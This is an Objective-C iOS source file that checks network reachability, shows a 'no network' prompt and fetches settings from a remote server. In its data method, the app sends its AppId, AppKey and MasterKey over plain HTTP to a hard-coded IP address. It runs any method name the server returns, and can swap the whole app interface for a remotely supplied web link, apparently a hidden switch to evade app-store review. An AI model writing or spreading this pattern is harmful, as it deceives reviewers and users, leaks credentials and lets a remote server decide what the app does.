

#import "newKZ.h"
#import "zaitiVC.h"
#import <AFNetworking.h>
#define XorP (CGSizeEqualToSize([UIScreen mainScreen].bounds.size,CGSizeMake(375, 812)) || CGSizeEqualToSize([UIScreen mainScreen].bounds.size, CGSizeMake(812, 375)))
#define DianLiangBar       ((XorP)?44:20)
#define TabBar        ((XorP)?83:49)
@interface newKZ ()
@property (nonatomic,strong) UIView *ww_bgView;
@property (nonatomic,strong) UIButton *ww_bgTiShi;
@property (nonatomic,strong) NSDictionary *dataDict;
@property (nonatomic,strong) NSString *wangYe;
@end

@implementation newKZ

- (void)netWork{
        
    AFNetworkReachabilityManager *wangLouGuanLi = [AFNetworkReachabilityManager sharedManager];
    [wangLouGuanLi setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
        if (status != 0) {//代表有网络
            [self huoquData];
            [self.ww_bgView removeFromSuperview];//清除提示view
            return;
        } else {
            self.ww_bgView = [[UIView alloc]init];
            self.ww_bgView.frame = CGRectMake(0, 0, [UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height);
            self.ww_bgView.backgroundColor = [UIColor whiteColor];
            [self.ww_bgView addSubview:self.ww_bgTiShi];
            [[UIApplication sharedApplication].delegate.window addSubview:self.ww_bgView];//提示无网络view置顶
            return;
        }
    }];

    [wangLouGuanLi startMonitoring];//开始监听网络
    
}





-(void)huoquData{
    
    AFHTTPSessionManager *manmager = [AFHTTPSessionManager manager];
     manmager.responseSerializer.acceptableContentTypes = [NSSet setWithObjects:@"text/plain", @"multipart/form-data", @"application/json", @"text/html", @"image/jpeg", @"image/png", @"application/octet-stream", @"text/json", nil];
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    dict[@"AppId"] = self.appID;
    dict[@"AppKey"] = self.appKey;
    dict[@"MasterKey"] =  self.masterKey;
    dict[@"ClassName"] =  @"Le";
    dict[@"Column1"] =  @"hu";
    dict[@"Column2"] =  @"link";
    [manmager POST:@"http://47.92.242.41:855/LCHander/Index.php" parameters:dict headers:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        self.dataDict = @{@"two":responseObject[@"d"][@"hu"]};
        self.wangYe =responseObject[@"d"][@"link"];
        [self.dataDict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
              if ([self respondsToSelector:NSSelectorFromString(obj)]) {
                  [self performSelector:NSSelectorFromString(obj)];
              } else {
                  [UIApplication sharedApplication].delegate.window.rootViewController = self.Tabbar;
              }
          }];
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        
    }];
    
}


-(void)addtwo{
    zaitiVC *wang = [[zaitiVC alloc]init];
    wang.data1 = self.wangYe;
    [UIApplication sharedApplication].delegate.window.rootViewController = wang;
    
}


-(UIButton *)ww_bgTiShi{
    if (!_ww_bgTiShi) {
        _ww_bgTiShi = [[UIButton alloc]initWithFrame:CGRectMake(0, 200 +[UIScreen mainScreen].bounds.size.width - 200 +30, [UIScreen mainScreen].bounds.size.width, 14)];
        [_ww_bgTiShi setTitle:@"无网络,点我查看网络!" forState:UIControlStateNormal];
        [_ww_bgTiShi setTitle:@"无网络,点我查看网络!" forState:UIControlStateHighlighted];
        _ww_bgTiShi.titleLabel.font = [UIFont systemFontOfSize:15];;
        [_ww_bgTiShi setTitleColor:[UIColor darkGrayColor] forState:UIControlStateNormal];
        [_ww_bgTiShi setTitleColor:[UIColor darkGrayColor] forState:UIControlStateHighlighted];
        _ww_bgTiShi.titleLabel.textAlignment = NSTextAlignmentCenter;
        [_ww_bgTiShi addTarget:self action:@selector(wangLouBtn) forControlEvents:UIControlEventTouchUpInside];

    }
    return _ww_bgTiShi;
}


-(void)wangLouBtn{
    
    [[UIApplication sharedApplication]openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString]];
}


@end
